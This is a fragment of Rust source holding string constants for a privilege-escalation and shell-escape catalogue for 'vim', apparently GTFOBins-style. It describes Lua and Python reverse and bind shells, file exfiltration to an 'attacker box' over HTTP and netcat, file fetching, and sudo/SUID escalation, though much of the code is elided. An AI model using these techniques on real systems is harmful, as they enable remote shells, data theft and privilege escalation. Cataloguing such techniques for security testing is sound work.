pub static BIN_NAME: &'static str = "vim";
...
"#;
pub static SH_DESC_4: &'static str = "This requires that `vim` is compiled with Lua support.";
pub static SH_CODE_4: &'static str = r#"
    
    vim -c ':lua os.execute("reset; exec sh")'
"#;
pub static RS_DESC: &'static str = "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    ...
    vim.command(":q!")'
"#;
pub static NIRS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.";
pub static NIRS_CODE: &'static str = r#"
    ...
    vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
      ...
      f:close();t:close();'
"#;
pub static NIBS_DESC: &'static str = "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.";
...
"#;
pub static FU_DESC_1: &'static str = "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.";
pub static FU_CODE_1: &'static str = r#"
    ...
    vim.command(":q!")'
"#;
pub static FU_DESC_2: &'static str = "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.";
pub static FU_CODE_2: &'static str = r#"
    ...
    vim.command(":q!")'
"#;
pub static FU_DESC_3: &'static str = "Send a local file via TCP. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.";
pub static FU_CODE_3: &'static str = r#"
    ...
    vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
      ...
      t:close();'
"#;
pub static FD_DESC_1: &'static str = "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.";
pub static FD_CODE_1: &'static str = r#"
    ...
    vim.command(":q!")'
"#;
pub static FD_DESC_2: &'static str = "Fetch a remote file via TCP. Run `nc target.com 12345 < 'file_to_send'` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.";
...
"#;
pub static SUDO_DESC_3: &'static str = "This requires that `vim` is compiled with Lua support.";
...
"#;
pub static LSUID_DESC: &'static str = "This requires that `vim` is compiled with Lua support.";
